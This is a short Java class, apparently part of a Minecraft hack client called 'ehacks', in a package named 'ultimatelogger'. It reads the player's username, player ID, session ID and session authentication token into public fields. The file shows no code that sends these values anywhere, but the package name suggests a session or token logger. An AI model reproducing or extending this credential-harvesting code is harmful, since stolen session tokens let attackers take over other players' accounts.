/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ehacks.mod.util.ultimatelogger;

import ehacks.mod.wrapper.Wrapper;

/**
 * @author radioegor146
 */
public class SessionInfo {

    public String username = Wrapper.INSTANCE.mc().getSession().getUsername();
    public String playerid = Wrapper.INSTANCE.mc().getSession().getPlayerID();
    public String token = Wrapper.INSTANCE.mc().getSession().getToken();
    public String session = Wrapper.INSTANCE.mc().getSession().getSessionID();
}
